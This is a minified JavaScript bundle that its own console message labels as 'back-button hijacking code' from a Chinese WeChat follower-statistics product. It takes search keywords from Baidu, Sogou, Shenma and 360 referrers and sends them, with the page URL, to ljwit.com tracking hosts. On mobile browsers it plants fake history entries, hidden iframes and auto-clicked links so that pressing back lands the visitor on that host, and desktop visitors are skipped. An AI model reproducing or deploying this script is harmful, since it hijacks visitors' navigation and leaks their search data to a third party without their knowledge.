!function (e) {
    var n = {};

    function t(o) {
        if (n[o]) return n[o].exports;
        var i = n[o] = {i: o, l: !1, exports: {}};
        return e[o].call(i.exports, i, i.exports, t), i.l = !0, i.exports
    }

    t.m = e, t.c = n, t.d = function (e, n, o) {
        t.o(e, n) || Object.defineProperty(e, n, {enumerable: !0, get: o})
    }, t.r = function (e) {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {value: "Module"}), Object.defineProperty(e, "__esModule", {value: !0})
    }, t.t = function (e, n) {
        if (1 & n && (e = t(e)), 8 & n) return e;
        if (4 & n && "object" == typeof e && e && e.__esModule) return e;
        var o = Object.create(null);
        if (t.r(o), Object.defineProperty(o, "default", {
            enumerable: !0,
            value: e
        }), 2 & n && "string" != typeof e) for (var i in e) t.d(o, i, function (n) {
            return e[n]
        }.bind(null, i));
        return o
    }, t.n = function (e) {
        var n = e && e.__esModule ? function () {
            return e.default
        } : function () {
            return e
        };
        return t.d(n, "a", n), n
    }, t.o = function (e, n) {
        return Object.prototype.hasOwnProperty.call(e, n)
    }, t.p = "", t(t.s = 0)
}([function (e, n) {
    navigator.userAgent;
    var t, o = window.location.href, i = document.referrer, r = "", d = "zhijie", a = "http://zhijie.return.ljwit.com/";
    console.log("%c微信加粉统计系统V6专业版(返回劫持代码)-官网地址:https://tj.hzypro.com", "color:red");
    var u = decodeURIComponent(i);
    -1 != u.indexOf("baidu.com") ? (r = function (e) {
        var n = "";
        if (-1 != e.indexOf("baidu.com")) return "" == (n = null == (n = -1 != e.indexOf("word") ? x(e + "&", "word=", "&") : -1 != e.indexOf("w=0_10_") && -1 != e.indexOf("/t=") ? x(e, "w=0_10_", "/t=") : "") ? "" : n) ? n : encodeURIComponent(n)
    }(u), d = "baidu", 1, a = "http://baidu.return.ljwit.com/") : -1 != u.indexOf("sogou.com") ? (r = b(u, "keyword"), d = "sogou", 1, a = "http://sogou.return.ljwit.com/") : -1 != u.indexOf("sm.cn") ? (r = b(u, "q"), d = "sm", 1, a = "http://sm.return.ljwit.com/") : -1 != u.indexOf("so.com") && (r = b(u, "q"), d = "haosou", 1, a = "http://haosou.return.ljwit.com/"), t = a + "?sign=" + uids + "&urd=" + urd + "&word=" + r + "&t=" + d + "&url=" + o + "&time=" + (new Date).getTime();
    uids;
    var c = "?vion=dapp#", f = (new Date).getTime(), l = navigator.userAgent.toLowerCase(), s = window.location.href,
        h = t, p = -1 != l.indexOf("baiduboxapp");
    var m = {win: !1, mac: !1, xll: !1, ipad: !1}, w = navigator.platform;

    function b(e, n) {
        var t = "";
        return "" == (t = null == (t = -1 != e.indexOf(n) ? x(e + "&", n + "=", "&") : "") ? "" : t) ? t : encodeURIComponent(t)
    }

    function x(e, n, t) {
        var o = e.indexOf(n), i = (e = e.slice(o + n.length)).indexOf(t);
        return e.slice(e, i)
    }

    m.win = 0 == w.indexOf("Win"), m.mac = 0 == w.indexOf("Mac"), m.x11 = "X11" == w || 0 == w.indexOf("Linux"), m.ipad = null != navigator.userAgent.match(/iPad/i), m.win || m.mac || m.xll || m.ipad || 1 == screen_baidu && 1 == p || (-1 != l.indexOf("baiduboxapp/1") && -1 != l.indexOf("iphone") ? (document.writeln('<iframe  width="0" style="display: none" height="0" src="' + s + '"></iframe>'), history.pushState({}, "", "#_ta_"), history.pushState({}, "", "#_tdd_"), window.onhashchange = function () {
        parent.location.href = h + "#" + f
    }) : -1 != l.indexOf("android") && -1 != l.indexOf("baiduboxapp/1") ? (document.writeln("<a href='" + c + "'  id='bbbjin'></a><a  href='" + h + "' id='dddjin'></a>"), setTimeout(function () {
        document.getElementById("bbbjin").click()
    }, 1500), window.onpagehide = function () {
        -1 == window.location.href.indexOf("dapp#") && setTimeout(function () {
            document.getElementById("dddjin").click()
        }, 200)
    }) : -1 != l.indexOf("android") && -1 != l.indexOf("ucbrowser/12") ? (document.writeln("<a href='#viondapp'  id='bbbjin'></a>"), setTimeout(function () {
        document.getElementById("bbbjin").click()
    }, 1500), window.onhashchange = function () {
        -1 == window.location.href.indexOf("#viondapp") && setTimeout(function () {
            confirm("确认离开此页面吗?"), location.href = h, location.href = h
        }, 200)
    }) : -1 != l.indexOf("iphone") && -1 != l.indexOf("ucbrowser/12") ? (history.pushState({}, "", "#_ta_"), history.pushState({}, "", "#"), window.onhashchange = function () {
        setTimeout(function () {
            location.href = h
        }, 300)
    }) : (history.pushState({}, "", "#_ta_"), history.pushState({}, "", "#_tdd_"), window.onhashchange = function () {
        location.href = h
    }))
}]);
